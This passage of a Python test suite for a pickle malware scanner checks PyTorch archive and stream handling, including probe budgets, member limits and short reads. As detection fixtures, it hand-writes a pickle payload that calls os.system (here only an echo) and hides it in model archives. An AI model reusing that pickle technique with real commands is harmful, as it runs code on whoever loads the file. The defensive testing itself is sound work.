    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert list(report.metadata["pickle_files"]) == ["archive/data.pkl"]


def test_scan_file_stops_hidden_pickle_discovery_at_aggregate_probe_budget(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    probe_budget = package_api._PICKLE_DISCOVERY_SHORT_PROBE_BYTES + package_api._PICKLE_DISCOVERY_LONG_PROBE_BYTES
    monkeypatch.setattr(
        package_api,
        "_MAX_PYTORCH_ZIP_PICKLE_DISCOVERY_PROBE_BYTES",
        probe_budget,
        raising=False,
    )
    archive_path = tmp_path / "hidden-probe-budget.pt"
    decoy = b"I0\n0" * 20_000
    with zipfile.ZipFile(archive_path, "w", compression=zipfile.ZIP_DEFLATED) as archive:
        archive.writestr("archive/decoy-0", decoy)
        archive.writestr("archive/decoy-1", decoy)
        archive.writestr("archive/version", "3\n")
        archive.writestr("archive/byteorder", "little")

    decompressed_probe_bytes = 0
    original_read = zipfile.ZipExtFile.read

    def count_probe_bytes(member: zipfile.ZipExtFile, size: int = -1) -> bytes:
        nonlocal decompressed_probe_bytes
        data = original_read(member, size)
        if str(member.name).startswith("archive/decoy-"):
            decompressed_probe_bytes += len(data)
        return data

    monkeypatch.setattr(zipfile.ZipExtFile, "read", count_probe_bytes)

    report = scan_file(archive_path)

    assert decompressed_probe_bytes == probe_budget
    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert report.metadata["analysis_incomplete"] is True
    assert report.coverage.raw_scan_complete is False
    assert report.coverage.opcode_scan_complete is False
    budget_notices = [notice for notice in report.notices if notice.code == "pytorch_zip_pickle_discovery_probe_budget"]
    assert len(budget_notices) == 1
    assert budget_notices[0].details["analysis_incomplete"] is True
    assert budget_notices[0].details["probe_bytes_read"] == probe_budget
    assert budget_notices[0].details["max_probe_bytes"] == probe_budget
    assert budget_notices[0].details["probed_member_count"] == 1
    assert budget_notices[0].details["skipped_member_count"] == 3
    assert next(iter(budget_notices[0].details["skipped_members"])) == "archive/decoy-1"


def test_scan_file_detects_hidden_pickle_at_aggregate_probe_budget_boundary(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    hidden_payload = b"cposix\nsystem\n(S'echo hidden'\ntR."
    probe_budget = len("3\n") + len("little") + package_api._PICKLE_DISCOVERY_SHORT_PROBE_BYTES + len(hidden_payload)
    monkeypatch.setattr(
        package_api,
        "_MAX_PYTORCH_ZIP_PICKLE_DISCOVERY_PROBE_BYTES",
        probe_budget,
        raising=False,
    )
    archive_path = tmp_path / "hidden-probe-boundary.pt"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("archive/version", "3\n")
        archive.writestr("archive/byteorder", "little")
        archive.writestr("archive/payload", hidden_payload)

    report = scan_file(archive_path)

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert list(report.metadata["pickle_files"]) == ["archive/payload"]
    assert any(finding.rule_code == "DANGEROUS_CALL" for finding in report.findings)
    assert all(notice.code != "pytorch_zip_pickle_discovery_probe_budget" for notice in report.notices)


def test_scan_file_keeps_small_benign_archive_complete_at_aggregate_probe_budget_boundary(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    version = b"3\n"
    byteorder = b"little"
    notes = b"weights"
    probe_budget = len(version) + len(byteorder) + len(notes)
    monkeypatch.setattr(
        package_api,
        "_MAX_PYTORCH_ZIP_PICKLE_DISCOVERY_PROBE_BYTES",
        probe_budget,
        raising=False,
    )
    archive_path = tmp_path / "benign-probe-boundary.pt"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
        archive.writestr("archive/version", version)
        archive.writestr("archive/byteorder", byteorder)
        archive.writestr("archive/notes", notes)

    report = scan_file(archive_path)

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.is_clean
    assert "analysis_incomplete" not in report.metadata
    assert all(notice.code != "pytorch_zip_pickle_discovery_probe_budget" for notice in report.notices)


def test_scan_file_marks_hidden_pytorch_zip_probe_failure_inconclusive(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    archive_path = tmp_path / "model.pt"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("archive/data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
        archive.writestr("archive/version", "3\n")
        archive.writestr("archive/byteorder", "little")
        archive.writestr("archive/payload", b"maybe hidden")

    original_open = zipfile.ZipFile.open

    def fail_hidden_probe_open(
        archive: zipfile.ZipFile,
        name: str | zipfile.ZipInfo,
        mode: str = "r",
        pwd: bytes | None = None,
        *,
        force_zip64: bool = False,
    ) -> object:
        member_name = name.filename if isinstance(name, zipfile.ZipInfo) else name
        if member_name == "archive/payload":
            raise NotImplementedError("unsupported compression method")
        return original_open(archive, name, mode=mode, pwd=pwd, force_zip64=force_zip64)

    monkeypatch.setattr(zipfile.ZipFile, "open", fail_hidden_probe_open)

    report = scan_file(archive_path)

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert report.errors == ()
    assert list(report.metadata["pickle_files"]) == ["archive/data.pkl"]
    probe_notices = [notice for notice in report.notices if notice.code == "pytorch_zip_member_probe_failed"]
    assert len(probe_notices) == 1
    assert probe_notices[0].location == f"{archive_path}:archive/payload"
    assert probe_notices[0].details["analysis_incomplete"] is True
    assert probe_notices[0].details["exception_type"] == "NotImplementedError"


def test_scan_file_detects_malicious_pytorch_zip_data_pickle(tmp_path: Path) -> None:
    archive_path = tmp_path / "model.pt"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("data.pkl", pickle.dumps(MaliciousPayload(), protocol=4))
        archive.writestr("version", "3\n")
        archive.writestr("byteorder", "little")

    report = scan_file(archive_path)

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(finding.rule_code == "DANGEROUS_CALL" for finding in report.findings)
    assert all(
        finding.location is not None and f"{archive_path}:data.pkl" in finding.location for finding in report.findings
    )


def test_scan_file_scans_pickle_members_without_data_pickle_in_pytorch_zip(tmp_path: Path) -> None:
    archive_path = tmp_path / "model.bin"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("custom.pkl", pickle.dumps(MaliciousPayload(), protocol=4))
        archive.writestr("version", "3\n")
        archive.writestr("byteorder", "little")

    report = scan_file(archive_path)

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert list(report.metadata["pickle_files"]) == ["custom.pkl"]
    assert any(
        finding.location is not None and f"{archive_path}:custom.pkl" in finding.location for finding in report.findings
    )


def test_scan_file_detects_hidden_pytorch_zip_pickle_member_without_data_pickle(tmp_path: Path) -> None:
    archive_path = tmp_path / "hidden-only.pt"
    hidden_payload = b"cposix\nsystem\n(S'echo hidden'\ntR."
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("archive/version", "3\n")
        archive.writestr("archive/byteorder", "little")
        archive.writestr("archive/payload", hidden_payload)

    report = scan_file(archive_path)

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert list(report.metadata["pickle_files"]) == ["archive/payload"]
    assert any(
        finding.rule_code == "DANGEROUS_CALL"
        and finding.location is not None
        and f"{archive_path}:archive/payload" in finding.location
        for finding in report.findings
    )


def test_scan_file_leaves_hidden_pickle_like_zip_without_pytorch_metadata_unrecognized(tmp_path: Path) -> None:
    archive_path = tmp_path / "hidden-only.zip"
    entry = zipfile.ZipInfo("archive/payload", (1980, 1, 1, 0, 0, 0))
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr(entry, pickle.dumps({"weights": [1, 2, 3]}, protocol=4))

    report = scan_file(archive_path)

    assert report.status == ScanStatus.ERROR
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert "container_type" not in report.metadata


def test_scan_file_returns_error_report_for_pytorch_zip_member_access_failure(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    archive_path = tmp_path / "encrypted.pt"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
        archive.writestr("version", "3\n")
        archive.writestr("byteorder", "little")

    original_open = zipfile.ZipFile.open

    def fail_member_open(
        archive: zipfile.ZipFile,
        name: str | zipfile.ZipInfo,
        mode: str = "r",
        pwd: bytes | None = None,
        *,
        force_zip64: bool = False,
    ) -> object:
        member_name = name.filename if isinstance(name, zipfile.ZipInfo) else name
        if member_name == "data.pkl":
            raise RuntimeError("unsupported encrypted member")
        return original_open(archive, name, mode=mode, pwd=pwd, force_zip64=force_zip64)

    monkeypatch.setattr(zipfile.ZipFile, "open", fail_member_open)

    report = scan_file(archive_path)

    assert report.status == ScanStatus.ERROR
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert len(report.errors) == 1
    assert report.errors[0].category == "zip_error"
    assert report.errors[0].exception_type == "RuntimeError"
    assert report.errors[0].location == f"{archive_path}:data.pkl"


def test_scan_file_leaves_generic_data_pickle_zip_as_raw_pickle_input(tmp_path: Path) -> None:
    archive_path = tmp_path / "generic.jpg"
    entry = zipfile.ZipInfo("data.pkl", (1980, 1, 1, 0, 0, 0))
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr(entry, pickle.dumps({"weights": [1, 2, 3]}, protocol=4))

    report = scan_file(archive_path)

    assert report.status == ScanStatus.ERROR
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert "container_type" not in report.metadata


def test_scan_file_marks_oversized_pytorch_zip_member_inconclusive(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    monkeypatch.setattr(package_api, "_MAX_PYTORCH_ZIP_PICKLE_MEMBER_BYTES", 4)
    archive_path = tmp_path / "model.pt"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
        archive.writestr("version", "3\n")
        archive.writestr("byteorder", "little")

    report = scan_file(archive_path)

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert report.findings == ()
    assert any(notice.code == "pytorch_zip_member_size_limit" for notice in report.notices)


def test_scan_file_marks_pytorch_zip_pickle_member_budget_incomplete(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    monkeypatch.setattr(package_api, "_MAX_PYTORCH_ZIP_PICKLE_MEMBERS", 2)
    archive_path = tmp_path / "member-budget.pt"
    safe_payload = pickle.dumps({"weights": [1, 2, 3]}, protocol=4)
    malicious_payload = pickle.dumps(MaliciousPayload(), protocol=4)
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("archive/data.pkl", safe_payload)
        archive.writestr("archive/near-limit.pkl", safe_payload)
        archive.writestr("archive/skipped-malicious.pkl", malicious_payload)
        archive.writestr("archive/version", "3\n")
        archive.writestr("archive/byteorder", "little")

    report = scan_file(archive_path)

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert report.findings == ()
    assert not report.is_clean
    assert report.coverage.raw_scan_complete is False
    assert report.coverage.opcode_scan_complete is False
    assert report.metadata["analysis_incomplete"] is True
    assert list(report.metadata["pickle_files"]) == [
        "archive/data.pkl",
        "archive/near-limit.pkl",
        "archive/skipped-malicious.pkl",
    ]
    assert len(report.metadata["member_reports"]) == 2
    budget_notices = [notice for notice in report.notices if notice.code == "pytorch_zip_pickle_member_budget"]
    assert len(budget_notices) == 1
    assert budget_notices[0].details["analysis_incomplete"] is True
    assert budget_notices[0].details["pickle_member_count"] == 3
    assert budget_notices[0].details["scanned_pickle_member_count"] == 2
    assert budget_notices[0].details["skipped_pickle_member_count"] == 1
    assert budget_notices[0].details["max_pickle_members"] == 2
    assert list(budget_notices[0].details["skipped_pickle_members"]) == ["archive/skipped-malicious.pkl"]


def test_scan_file_marks_pytorch_zip_pickle_member_total_bytes_budget_incomplete(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    archive_path = tmp_path / "member-byte-budget.pt"
    safe_payload = pickle.dumps({"weights": [1, 2, 3]}, protocol=4)
    malicious_payload = pickle.dumps(MaliciousPayload(), protocol=4)
    monkeypatch.setattr(package_api, "_MAX_PYTORCH_ZIP_PICKLE_MEMBERS", 10)
    monkeypatch.setattr(package_api, "_MAX_PYTORCH_ZIP_PICKLE_TOTAL_MEMBER_BYTES", len(safe_payload) * 2)
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("archive/data.pkl", safe_payload)
        archive.writestr("archive/near-limit.pkl", safe_payload)
        archive.writestr("archive/skipped-malicious.pkl", malicious_payload)
        archive.writestr("archive/version", "3\n")
        archive.writestr("archive/byteorder", "little")

    report = scan_file(archive_path)

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert report.findings == ()
    assert report.metadata["analysis_incomplete"] is True
    assert len(report.metadata["member_reports"]) == 2
    budget_notices = [notice for notice in report.notices if notice.code == "pytorch_zip_pickle_member_budget"]
    assert len(budget_notices) == 1
    assert budget_notices[0].details["pickle_member_count"] == 3
    assert budget_notices[0].details["scanned_pickle_member_count"] == 2
    assert budget_notices[0].details["max_pickle_members"] == 10
    assert budget_notices[0].details["total_pickle_member_bytes"] == len(safe_payload) * 2 + len(malicious_payload)
    assert budget_notices[0].details["scanned_pickle_member_bytes"] == len(safe_payload) * 2
    assert budget_notices[0].details["max_total_pickle_member_bytes"] == len(safe_payload) * 2
    assert list(budget_notices[0].details["skipped_pickle_members"]) == ["archive/skipped-malicious.pkl"]


def test_scan_file_scans_pytorch_zip_pickle_member_budget_boundary(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    archive_path = tmp_path / "member-budget-boundary.pt"
    safe_payload = pickle.dumps({"weights": [1, 2, 3]}, protocol=4)
    monkeypatch.setattr(package_api, "_MAX_PYTORCH_ZIP_PICKLE_MEMBERS", 2)
    monkeypatch.setattr(package_api, "_MAX_PYTORCH_ZIP_PICKLE_TOTAL_MEMBER_BYTES", len(safe_payload) * 2)
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("archive/data.pkl", safe_payload)
        archive.writestr("archive/near-limit.pkl", safe_payload)
        archive.writestr("archive/version", "3\n")
        archive.writestr("archive/byteorder", "little")

    report = scan_file(archive_path)

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.is_clean
    assert "analysis_incomplete" not in report.metadata
    assert list(report.metadata["pickle_files"]) == ["archive/data.pkl", "archive/near-limit.pkl"]
    assert len(report.metadata["member_reports"]) == 2
    assert all(notice.code != "pytorch_zip_pickle_member_budget" for notice in report.notices)


def test_scan_file_enforces_pytorch_zip_entry_cap_before_opening_archive(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    monkeypatch.setattr(package_api, "_MAX_PYTORCH_ZIP_ENTRIES", 2)
    archive_path = tmp_path / "entry-limit.pt"
    with zipfile.ZipFile(archive_path, "w") as archive:
        archive.writestr("data.pkl", pickle.dumps({"weights": [1, 2, 3]}, protocol=4))
        archive.writestr("version", "3\n")
        archive.writestr("byteorder", "little")

    class UnexpectedZipFile:
        def __init__(self, path: Path, mode: str) -> None:
            del path, mode
            raise AssertionError("entry limit should be enforced before ZipFile opens the archive")

    monkeypatch.setattr(package_api.zipfile, "ZipFile", UnexpectedZipFile)

    report = PickleScanner()._scan_pytorch_zip_file(
        archive_path,
        source=str(archive_path),
        size=archive_path.stat().st_size,
    )

    assert report is not None
    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.UNKNOWN
    notices = [notice for notice in report.notices if notice.code == "pytorch_zip_entry_limit"]
    assert len(notices) == 1
    assert notices[0].details["analysis_incomplete"] is True
    assert notices[0].details["entry_count"] == 3
    assert notices[0].details["max_entries"] == 2


def test_scan_file_scans_pytorch_zip_member_partial_bytes_on_short_read(
    monkeypatch: pytest.MonkeyPatch,
    tmp_path: Path,
) -> None:
    archive_path = tmp_path / "short-read.pt"
    archive_path.write_bytes(b"fake zip placeholder")
    payload = pickle.dumps(MaliciousPayload(), protocol=4)

    data_entry = zipfile.ZipInfo("data.pkl")
    data_entry.file_size = len(payload) + 8
    version_entry = zipfile.ZipInfo("version")
    version_entry.file_size = 2

    class ShortReadArchive:
        def __init__(self, path: Path, mode: str) -> None:
            self.path = path
            self.mode = mode

        def __enter__(self) -> ShortReadArchive:
            return self

        def __exit__(self, exc_type: object, exc: object, traceback: object) -> None:
            return None

        def infolist(self) -> list[zipfile.ZipInfo]:
            return [data_entry, version_entry]

        def open(
            self,
            name: str | zipfile.ZipInfo,
            mode: str = "r",
            pwd: bytes | None = None,
            *,
            force_zip64: bool = False,
        ) -> io.BytesIO:
            del mode, pwd, force_zip64
            member_name = name.filename if isinstance(name, zipfile.ZipInfo) else name
            if member_name == "data.pkl":
                return io.BytesIO(payload)
            return io.BytesIO(b"3\n")

    monkeypatch.setattr(package_api.zipfile, "ZipFile", ShortReadArchive)

    report = PickleScanner()._scan_pytorch_zip_file(
        archive_path,
        source=str(archive_path),
        size=archive_path.stat().st_size,
    )

    assert report is not None
    assert report.status == ScanStatus.ERROR
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(finding.rule_code == "DANGEROUS_CALL" for finding in report.findings)
    assert any(error.category == "short_read" for error in report.errors)
    assert report.metadata["container_type"] == "pytorch_zip"


def test_scan_file_returns_error_report_for_missing_file(tmp_path: Path) -> None:
    missing_path = tmp_path / "missing.pkl"

    report = scan_file(missing_path)

    assert report.source == str(missing_path)
    assert report.status == ScanStatus.ERROR
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert report.findings == ()
    assert len(report.errors) == 1
    assert report.errors[0].category == "io_error"
    assert report.errors[0].exception_type == "FileNotFoundError"
    assert report.coverage.bytes_scanned == 0
    assert report.coverage.bytes_total is None
    assert report.coverage.raw_scan_complete is False
    assert report.coverage.opcode_scan_complete is False


def test_scan_stream_returns_error_report_for_read_failures() -> None:
    report = PickleScanner().scan_stream(UnreadableStream(), source="broken-stream.pkl", size=16)

    assert report.status == ScanStatus.ERROR
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert report.findings == ()
    assert len(report.errors) == 1
    assert report.errors[0].category == "io_error"
    assert report.errors[0].exception_type == "OSError"
    assert report.coverage.bytes_scanned == 0
    assert report.coverage.bytes_total == 16
    assert report.coverage.raw_scan_complete is False
    assert report.coverage.opcode_scan_complete is False


def test_scan_stream_returns_error_report_for_runtime_read_failures() -> None:
    report = PickleScanner().scan_stream(RuntimeFailingStream(), source="broken-stream.pkl", size=16)

    assert report.status == ScanStatus.ERROR
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert report.findings == ()
    assert len(report.errors) == 1
    assert report.errors[0].category == "io_error"
    assert report.errors[0].exception_type == "RuntimeError"
    assert report.coverage.bytes_scanned == 0
    assert report.coverage.bytes_total == 16


def test_scan_stream_returns_empty_input_error_for_empty_unknown_size_stream() -> None:
    report = PickleScanner().scan_stream(io.BytesIO(b""), source="empty-stream.pkl")

    assert report.status == ScanStatus.ERROR
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert report.findings == ()
    assert len(report.errors) == 1
    assert report.errors[0].category == "empty_input"
    assert report.coverage.bytes_scanned == 0
    assert report.coverage.bytes_total is None
    assert report.coverage.raw_scan_complete is False
    assert report.coverage.opcode_scan_complete is False


def test_scan_stream_treats_negative_size_as_unknown_size() -> None:
    payload = pickle.dumps({"safe": True}, protocol=4)

    report = PickleScanner().scan_stream(io.BytesIO(payload), source="unknown-size.pkl", size=-1)

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.errors == ()
    assert report.coverage.bytes_total is None
    assert report.coverage.bytes_scanned == len(payload)


def test_native_payload_scan_normalizes_negative_private_size_guard() -> None:
    payload = pickle.dumps({"safe": True}, protocol=4)

    report = package_api._scan_pickle_payload_native(
        payload,
        source="private-negative-size.pkl",
        options=ScanOptions(),
        bytes_total=-1,
        position_offset=-5,
    )

    assert report.status == ScanStatus.COMPLETE
    assert report.errors == ()
    assert report.coverage.bytes_total is None
    assert report.coverage.bytes_scanned == len(payload)


def test_scan_stream_fails_closed_on_short_reads_for_expected_size() -> None:
    payload = pickle.dumps({"safe": True})
    expected_size = len(payload) + 8

    report = PickleScanner().scan_stream(
        io.BytesIO(payload),
        source="truncated-stream.pkl",
        size=expected_size,
    )

    assert report.status == ScanStatus.ERROR
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert report.findings == ()
    assert len(report.errors) == 1
    assert report.errors[0].category == "short_read"
    assert report.coverage.bytes_scanned == len(payload)
    assert report.coverage.bytes_total == expected_size
    assert report.coverage.raw_scan_complete is False
    assert report.coverage.opcode_scan_complete is False


def test_scan_stream_short_read_does_not_report_unproven_oversized_frame_tamper() -> None:
    prefix = b"HEADER"
    payload = b"\x80\x04\x95\x02\x00\x00\x00\x00\x00\x00\x00}."
    stream = io.BytesIO(prefix + payload[:11])
    stream.seek(len(prefix))

    report = PickleScanner().scan_stream(
        stream,
        source="short-read-frame.pkl",
        size=len(payload),
    )

    assert report.status == ScanStatus.ERROR
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert report.findings == ()
    assert not any(notice.code == "oversized_frame" for notice in report.notices)
    assert any(error.category == "short_read" for error in report.errors)


def test_scan_stream_short_read_preserves_proven_oversized_frame_tamper() -> None:
    payload = b"\x80\x04\x95\x03\x00\x00\x00\x00\x00\x00\x00}."

    report = PickleScanner().scan_stream(
        io.BytesIO(payload[:11]),
        source="short-read-proven-oversized-frame.pkl",
        size=len(payload),
    )

    assert report.status == ScanStatus.ERROR
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    finding = next(finding for finding in report.findings if finding.rule_code == "STRUCTURAL_TAMPER")
    assert finding.details["tamper_type"] == "oversized_frame"
    assert finding.details["frame_length"] == 3
    assert any(notice.code == "oversized_frame" for notice in report.notices)
    assert any(error.category == "short_read" for error in report.errors)


def test_stream_report_copy_helpers_preserve_private_metadata() -> None:
    private_metadata = {"call_graph_source_fingerprints": {"reusable": True}}
    report = PickleReport(
        source="metadata-preservation.pkl",
        status=ScanStatus.COMPLETE,
        verdict=SafetyVerdict.SUSPICIOUS,
        notices=(
            package_api.Notice(
                message="Unproven oversized frame",
                code="oversized_frame",
                details={},
            ),
        ),
        private_metadata=private_metadata,
    )

    copied_reports = (
        package_api._without_unproven_oversized_frame_tamper(
            report,
            bytes_total=None,
            stream_start_offset=0,
        ),
        package_api._with_unbounded_stream_notice(
            report,
            source=report.source,
            bytes_scanned=8,
            max_unbounded_read_bytes=8,
        ),
        package_api._with_known_stream_notice(
            report,
            source=report.source,
            bytes_scanned=8,
            bytes_total=16,
            max_known_read_bytes=8,
            stream_start_offset=0,
        ),
        package_api._with_short_read_error(
            report,
            source=report.source,
            error=package_api._StreamShortReadError(expected_size=16, bytes_read=8, partial_payload=b"partial"),
            stream_start_offset=0,
        ),
    )

    assert all(copied.private_metadata == private_metadata for copied in copied_reports)


def test_scan_stream_scans_partial_bytes_on_short_read() -> None:
    payload = pickle.dumps(MaliciousPayload(), protocol=4)
    expected_size = len(payload) + 8

    report = PickleScanner().scan_stream(
        io.BytesIO(payload),
        source="malicious-short-read.pkl",
        size=expected_size,
    )

    assert report.status == ScanStatus.ERROR
    assert report.verdict == SafetyVerdict.MALICIOUS
    assert any(finding.rule_code == "DANGEROUS_CALL" for finding in report.findings)
    assert any(error.category == "short_read" for error in report.errors)
    assert report.metadata["stream_short_read"] is True
    assert report.coverage.bytes_scanned == len(payload)
    assert report.coverage.bytes_total == expected_size


def test_scan_stream_incrementally_reads_bounded_streams_without_preloading_entire_payload(
    monkeypatch: pytest.MonkeyPatch,
) -> None:
    payload = pickle.dumps(list(range(512)), protocol=4)
    stream = NoBulkReadStream(payload, max_read_size=32)
    monkeypatch.setattr(package_api, "_RUST_STREAM_READ_CHUNK_SIZE", 32)

    report = PickleScanner().scan_stream(stream, source="chunked.pkl", size=len(payload))

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.coverage.bytes_scanned == len(payload)
    assert stream.max_seen_read_size <= 32


def test_scan_stream_honors_explicit_reads_without_declared_size() -> None:
    payload = pickle.dumps(b"a" * 64, protocol=4)

    report = PickleScanner(ScanOptions(max_unbounded_stream_read_bytes=len(payload) + 1)).scan_stream(
        io.BytesIO(payload),
        source="unknown-size-binbytes.pkl",
    )

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.errors == ()
    assert report.coverage.bytes_scanned == len(payload)


def test_scan_stream_allows_unknown_size_stream_at_exact_total_cap() -> None:
    payload = pickle.dumps(b"a" * 64, protocol=4)

    report = PickleScanner(ScanOptions(max_unbounded_stream_read_bytes=len(payload))).scan_stream(
        io.BytesIO(payload),
        source="unknown-size-exact-cap.pkl",
    )

    assert report.status == ScanStatus.COMPLETE
    assert report.verdict == SafetyVerdict.CLEAN
    assert report.errors == ()
    assert report.coverage.bytes_scanned == len(payload)


def test_scan_stream_enforces_total_unbounded_stream_read_limit() -> None:
    payload = pickle.dumps(b"a" * 64, protocol=4)

    report = PickleScanner(ScanOptions(max_unbounded_stream_read_bytes=8)).scan_stream(
        io.BytesIO(payload),
        source="unknown-size-over-limit.pkl",
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert report.findings == ()
    assert not any(error.category == "io_error" for error in report.errors)
    assert any(notice.code == "unbounded_stream_truncated" for notice in report.notices)


def test_scan_stream_does_not_overflow_probe_non_seekable_unknown_size_streams() -> None:
    payload = pickle.dumps(b"a" * 64, protocol=4)
    stream = NonSeekableExactLimitStream(payload, limit=8)

    report = PickleScanner(ScanOptions(max_unbounded_stream_read_bytes=8)).scan_stream(
        stream,
        source="unknown-size-nonseek-exact-cap.pkl",
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert not any(error.category == "io_error" for error in report.errors)
    assert any(notice.code == "unbounded_stream_truncated" for notice in report.notices)


def test_scan_stream_enforces_total_known_stream_read_limit() -> None:
    payload = pickle.dumps(b"a" * 64, protocol=4)
    stream = NoBulkReadStream(payload, max_read_size=8)

    report = PickleScanner(ScanOptions(max_known_stream_read_bytes=8)).scan_stream(
        stream,
        source="known-size-over-limit.pkl",
        size=len(payload),
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert report.findings == ()
    assert not any(error.category == "io_error" for error in report.errors)
    notice = next(notice for notice in report.notices if notice.code == "known_stream_truncated")
    assert notice.details["bytes_scanned"] == 8
    assert report.coverage.bytes_total == len(payload)
    assert stream.max_seen_read_size <= 8


def test_scan_stream_known_size_cap_does_not_report_native_short_read() -> None:
    pickle_prefix = pickle.dumps({"safe": True}, protocol=4)
    payload = pickle_prefix + (b"ignored-tail" * 8)

    report = PickleScanner(ScanOptions(max_known_stream_read_bytes=len(pickle_prefix))).scan_stream(
        io.BytesIO(payload),
        source="known-size-complete-prefix.pkl",
        size=len(payload),
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert report.errors == ()
    assert any(notice.code == "known_stream_truncated" for notice in report.notices)
    assert report.coverage.bytes_scanned == len(pickle_prefix)
    assert report.coverage.bytes_total == len(payload)


def test_scan_stream_known_size_cap_does_not_report_unproven_oversized_frame_tamper() -> None:
    prefix = b"HEADER"
    payload = b"\x80\x04\x95\x02\x00\x00\x00\x00\x00\x00\x00}."
    stream = io.BytesIO(prefix + payload)
    stream.seek(len(prefix))

    report = PickleScanner(ScanOptions(max_known_stream_read_bytes=11)).scan_stream(
        stream,
        source="known-size-capped-frame.pkl",
        size=len(payload),
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.UNKNOWN
    assert report.findings == ()
    assert not any(notice.code == "oversized_frame" for notice in report.notices)
    assert any(notice.code == "known_stream_truncated" for notice in report.notices)


def test_scan_stream_known_size_cap_preserves_proven_oversized_frame_tamper() -> None:
    payload = b"\x80\x04\x95\x03\x00\x00\x00\x00\x00\x00\x00}."

    report = PickleScanner(ScanOptions(max_known_stream_read_bytes=11)).scan_stream(
        io.BytesIO(payload),
        source="known-size-capped-oversized-frame.pkl",
        size=len(payload),
    )

    assert report.status == ScanStatus.INCONCLUSIVE
    assert report.verdict == SafetyVerdict.SUSPICIOUS
    finding = next(finding for finding in report.findings if finding.rule_code == "STRUCTURAL_TAMPER")
    assert finding.details["tamper_type"] == "oversized_frame"
    assert any(notice.code == "oversized_frame" for notice in report.notices)
    assert any(notice.code == "known_stream_truncated" for notice in report.notices)


def test_scan_stream_known_size_cap_preserves_multistream_oversized_frame_tamper() -> None:
    first_stream = pickle.dumps({"safe": True}, protocol=4)
    declared_remaining_after_frame = 11
    frame_length = declared_remaining_after_frame + 1
    second_stream = b"\x80\x04\x95" + frame_length.to_bytes(8, "little") + (b"." * declared_remaining_after_frame)
    payload = first_stream + second_stream
    max_known_read_bytes = len(payload) - 1

    report = PickleScanner(ScanOptions(max_known_stream_read_bytes=max_known_read_bytes)).scan_stream(
        io.BytesIO(payload),
        source="known-size-capped-multistream-frame.pkl",
